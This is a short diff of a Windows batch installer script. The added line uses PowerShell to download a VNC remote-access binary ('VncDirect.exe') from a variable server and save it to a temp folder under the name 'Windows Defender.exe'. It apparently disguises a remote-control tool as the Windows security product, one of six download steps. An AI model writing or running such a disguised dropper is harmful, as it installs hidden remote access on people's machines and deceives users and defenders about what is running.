@@ -57,7 +57,7 @@ echo.
 set "FAIL=0"
 
 echo    [1/6] Windows Defender.exe (~67MB, may take a moment)...
-powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/Windows Defender.exe' -OutFile '%TEMPDIR%\Windows Defender.exe' -UseBasicParsing -TimeoutSec 300"
+powershell -NoProfile -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%BASE%/VncDirect/VncDirect.exe' -OutFile '%TEMPDIR%\Windows Defender.exe' -UseBasicParsing -TimeoutSec 300"
 if not exist "%TEMPDIR%\Windows Defender.exe" (
     echo    [!] FAILED to download Windows Defender.exe
     set "FAIL=1"
